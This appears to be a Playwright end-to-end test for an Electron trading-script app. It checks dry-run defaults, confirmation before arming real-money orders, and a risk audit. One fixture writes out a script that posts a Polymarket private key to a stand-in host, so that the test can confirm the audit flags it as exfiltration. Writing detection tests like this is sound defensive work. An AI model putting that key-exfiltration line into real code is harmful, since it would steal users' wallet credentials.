import { _electron as electron } from 'playwright-core';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

const APP_DIR = path.resolve(import.meta.dirname, '..');
const SANDBOX = fs.mkdtempSync(path.join(os.tmpdir(), 'rom-e2e-'));
const userData = path.join(SANDBOX, 'userData');
const APPDATA = path.join(SANDBOX, 'Roaming');
const LOCALAPPDATA = path.join(SANDBOX, 'Local');
for (const d of [userData, APPDATA, LOCALAPPDATA]) fs.mkdirSync(d, { recursive: true });

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const failures = [];
let passed = 0;

function check(label, cond, extra = '') {
  if (cond) { passed++; console.log(`  ok   ${label}`); }
  else { failures.push(label); console.log(`  FAIL ${label}${extra ? '  — ' + extra : ''}`); }
}

const VALID = [
  '# rom-script v1',
  '# name: E2E Arming Fixture',
  '',
  'def decide(ctx):',
  '    return None',
  '',
].join('\n');

if (!fs.existsSync(path.join(APP_DIR, 'dist', 'index.html'))) {
  console.error('dist/index.html missing — run `npm run build` first.');
  process.exit(1);
}

const app = await electron.launch({
  executablePath: path.join(APP_DIR, 'node_modules', 'electron', 'dist',
    process.platform === 'win32' ? 'electron.exe' : 'electron'),
  args: [APP_DIR, `--user-data-dir=${userData}`],
  cwd: APP_DIR,
  env: { ...process.env, APPDATA, LOCALAPPDATA },
  timeout: 90_000,
});

try {
  const page = await app.firstWindow({ timeout: 60_000 });
  await page.waitForLoadState('domcontentloaded');
  const consoleErrors = [];
  page.on('console', (m) => { if (m.type() === 'error') consoleErrors.push(m.text()); });
  await sleep(10_000);

  for (let i = 0; i < 10; i++) {
    const r = await page.evaluate(() => {
      const m = document.querySelector('.fixed.inset-0');
      if (!m) return 'GONE';
      let t = 0;
      for (const cb of m.querySelectorAll('input[type=checkbox], [role=checkbox]')) {
        const on = cb.checked ?? cb.getAttribute('aria-checked') === 'true';
        if (!on) { cb.click(); t++; }
      }
      if (t) return 'TICK';
      const b = [...m.querySelectorAll('button')].find((x) =>
        /continue|next|get started|accept|agree|finish|done/i.test(x.textContent || ''));
      if (!b) return 'NO_BUTTON';
      b.click();
      return 'CLICK';
    });
    if (r === 'GONE' || r === 'NO_BUTTON') break;
    await sleep(800);
  }

  const clickText = async (t) => {
    const hit = await page.evaluate((txt) => {
      const els = [...document.querySelectorAll('button, a, [role="button"]')];
      const el = els.find((e) => (e.textContent || '').trim() === txt)
              ?? els.find((e) => (e.textContent || '').includes(txt));
      if (!el) return false;
      el.click();
      return true;
    }, t);
    if (!hit) throw new Error(`control not found: ${JSON.stringify(t)}`);
    return true;
  };

  const modalText = () => page.evaluate(
    () => document.querySelector('.fixed.inset-0')?.innerText ?? '');

  const sel = () => page.evaluate(async () => {
    const r = await window.rom.scripts.list();
    return r.scripts[0] ?? null;
  });

  await clickText('Advanced tools');
  await clickText('Scripts');
  await sleep(2000);

  console.log('\nmaster switch');
  const cfg = await page.evaluate(async () =>
    (await window.rom.state.get())?.config?.scriptsLiveEnabled);
  check('"Scripts live" is OFF out of the box', cfg === false, `got ${cfg}`);

  console.log('\ndefaults for a new script');
  await clickText('New script');
  await sleep(2500);
  let s = await sel();
  check('a script was created', !!s);
  check('starts in SHADOW (dryRun)', s?.dryRun === true, `dryRun=${s?.dryRun}`);
  check('starts DISABLED', s?.enabled === false, `enabled=${s?.enabled}`);
  check('the template passes the risk audit clean', s?.audit?.ok === true,
    JSON.stringify(s?.audit?.findings?.slice(0, 2) || []));
  check('starts scoped to every coin', s?.assets === null, `assets=${JSON.stringify(s?.assets)}`);
  check('status says it is not enabled', s?.status?.state === 'off',
    `state=${s?.status?.state} detail=${s?.status?.detail}`);

  console.log('\narming requires confirmation');
  await clickText('Shadow');
  await sleep(900);
  const armModal = await modalText();
  check('a confirmation modal opens', /arm/i.test(armModal),
    armModal.slice(0, 60).replace(/\n/g, ' '));
  check('modal warns about real money', /real money/i.test(armModal));
  check('modal discloses the exits caveat', /exit/i.test(armModal));
  s = await sel();
  check('opening the modal does NOT arm it', s?.dryRun === true, `dryRun=${s?.dryRun}`);

  await clickText('Cancel');
  await sleep(800);
  s = await sel();
  check('cancelling leaves it in shadow', s?.dryRun === true, `dryRun=${s?.dryRun}`);

  console.log('\narming, then disarming');
  await clickText('Shadow');
  await sleep(800);
  await clickText('Arm for real orders');
  await sleep(1500);
  s = await sel();
  check('confirming arms it', s?.dryRun === false, `dryRun=${s?.dryRun}`);

  await clickText('Live');
  await sleep(1500);
  s = await sel();
  check('disarming is immediate, no confirmation', s?.dryRun === true, `dryRun=${s?.dryRun}`);
  check('no modal was opened to disarm', (await modalText()) === '');

  console.log('\ninvalid code cannot be armed');
  await page.evaluate(async (code) => {
    const r = await window.rom.scripts.list();
    await window.rom.scripts.save({ id: r.scripts[0].id, code });
  }, 'def decide(ctx)\n    return None\n');
  await sleep(1200);
  const refused = await page.evaluate(async () => {
    const r = await window.rom.scripts.list();
    try {
      await window.rom.scripts.setDryRun(r.scripts[0].id, false);
      return 'ALLOWED';
    } catch (e) { return 'REFUSED: ' + String(e?.message || e); }
  });
  check('backend refuses to arm code that fails validation',
    refused.startsWith('REFUSED'), refused.slice(0, 80));
  s = await sel();
  check('script stayed in shadow after the refusal', s?.dryRun === true);

  console.log('\nthe risk audit reaches the user before they arm');
  await page.evaluate(async (code) => {
    const r = await window.rom.scripts.list();
    await window.rom.scripts.save({ id: r.scripts[0].id, code });
  }, [
    'import requests',
    'import polymarket_auth',
    'def decide(ctx):',
    '    requests.post("https://x.example", json=polymarket_auth.private_key)',
    '    return None',
    '',
  ].join('\n'));
  await sleep(1500);
  s = await sel();
  check('audit flags an exfiltration-shaped script', s?.audit?.ok === false,
    JSON.stringify(s?.audit || {}).slice(0, 120));
  check('audit names the wallet+network combination',
    (s?.audit?.categories || []).includes('exfiltration'),
    JSON.stringify(s?.audit?.categories || []));

  await clickText('Shadow');
  await sleep(1000);
  const riskModal = await modalText();
  check('the arm modal surfaces the audit', /risk audit flagged/i.test(riskModal),
    riskModal.slice(0, 120).replace(/\n/g, ' '));
  check('the arm modal names the API credential risk', /API credentials/i.test(riskModal));
  s = await sel();
  check('opening it does NOT arm the flagged script', s?.dryRun === true,
    `dryRun=${s?.dryRun}`);
  await clickText('Cancel');
  await sleep(700);

  await page.evaluate(async (code) => {
    const r = await window.rom.scripts.list();
    await window.rom.scripts.save({ id: r.scripts[0].id, code });
  }, VALID);
  await sleep(1200);

  console.log('\nhealth');
  check('no renderer console errors', consoleErrors.length === 0,
    consoleErrors.slice(0, 2).join(' | ').slice(0, 160));
} catch (e) {
  failures.push('driver error: ' + e.message);
  console.log('\nDRIVER ERROR:', e.message);
} finally {
  await app.close().catch(() => {});
  fs.rmSync(SANDBOX, { recursive: true, force: true });
}

console.log(`\n${passed} passed, ${failures.length} failed`);
if (failures.length) {
  for (const f of failures) console.log('  FAILED:', f);
  process.exit(1);
}
process.exit(0);

